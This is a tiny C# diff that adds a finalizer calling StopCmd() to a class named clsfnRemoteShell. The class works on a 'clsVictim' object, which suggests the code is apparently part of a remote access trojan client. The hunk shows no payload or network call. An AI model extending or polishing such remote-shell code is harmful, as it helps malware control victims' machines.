@@ -60,6 +60,8 @@ namespace winClient48
             Init(v);
         }
 
+        ~clsfnRemoteShell() => StopCmd();
+
         private void Init(clsVictim v)
         {
             try
